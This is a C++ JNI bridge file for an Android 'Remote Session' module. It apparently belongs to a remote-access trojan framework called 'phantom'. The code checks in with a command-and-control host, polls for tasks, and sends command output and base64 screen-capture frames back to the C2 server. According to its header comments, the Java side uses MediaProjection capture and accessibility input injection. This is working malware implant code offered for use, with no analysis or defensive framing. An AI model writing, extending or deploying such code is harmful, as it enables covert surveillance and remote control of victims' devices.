// ============================================================================
//  native_bridge.cpp — Android Remote Session module: JNI <-> shared C2 core.
//  ────────────────────────────────────────────────────────────────────────────
//  The Android module reuses the SAME wire protocol, AES-256-GCM crypto and
//  per-beacon HMAC identity as the desktop remote module (remote_net.h), so
//  frames/results land in the same C2 store and render in the same UI canvas.
//
//  Java owns the Android-only APIs (MediaProjection capture, accessibility
//  input injection); this bridge owns transport + crypto + task parsing.
//
//  Exposed to Java (com.phantom.remote.C2Native):
//    nativeCheckin()                  -> server hello / key check
//    nativePoll()                     -> String[] of "taskId\u0001command"
//    nativeSendResult(taskId, output) -> boolean
//    nativeSendStream(taskId, frameB64) -> boolean (frame is already prefixed)
// ============================================================================

#include <jni.h>
#include <string>
#include <vector>

#include "remote_net.h"

namespace {

remote_net::RemoteConfig& config() {
    static remote_net::RemoteConfig cfg = [] {
        remote_net::RemoteConfig c;
        c.host = C2_HOST;
        c.port = C2_PORT;
        c.use_https = C2_USE_HTTPS;
        c.beacon_id = REMOTE_BEACON_ID;
        return c;
    }();
    return cfg;
}

std::string jstr(JNIEnv* env, jstring s) {
    if (!s) return "";
    const char* c = env->GetStringUTFChars(s, nullptr);
    std::string out = c ? c : "";
    if (c) env->ReleaseStringUTFChars(s, c);
    return out;
}

jstring to_jstr(JNIEnv* env, const std::string& s) {
    return env->NewStringUTF(s.c_str());
}

} // namespace

extern "C" {

JNIEXPORT jstring JNICALL
Java_com_phantom_remote_C2Native_nativeCheckin(JNIEnv* env, jclass) {
    return to_jstr(env, remote_net::checkin(config()));
}

JNIEXPORT jobjectArray JNICALL
Java_com_phantom_remote_C2Native_nativePoll(JNIEnv* env, jclass) {
    std::string body = remote_net::checkin(config());
    std::vector<remote_net::RemoteTask> tasks = remote_net::parse_tasks(body);

    jclass str_cls = env->FindClass("java/lang/String");
    jobjectArray arr = env->NewObjectArray((jsize)tasks.size(), str_cls, nullptr);
    for (size_t i = 0; i < tasks.size(); ++i) {
        // "taskId\u0001command" — split on the Java side
        std::string rec = tasks[i].task_id + "\x01" + tasks[i].command;
        env->SetObjectArrayElement(arr, (jsize)i, to_jstr(env, rec));
    }
    return arr;
}

JNIEXPORT jboolean JNICALL
Java_com_phantom_remote_C2Native_nativeSendResult(JNIEnv* env, jclass,
                                                   jstring taskId, jstring output) {
    std::string id = jstr(env, taskId);
    std::string out = jstr(env, output);
    return remote_net::send_result(config(), id, out) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_phantom_remote_C2Native_nativeSendStream(JNIEnv* env, jclass,
                                                   jstring taskId, jstring frameB64) {
    std::string id = jstr(env, taskId);
    std::string frame = jstr(env, frameB64);
    if (id.empty() || frame.empty()) return JNI_FALSE;
    // Frames ride on the task that started streaming, exactly like the
    // desktop module, so the C2 stores them in data/remote/ and the UI
    // attaches them to the same remote-session view.
    return remote_net::send_result(config(), id, frame) ? JNI_TRUE : JNI_FALSE;
}

} // extern "C"
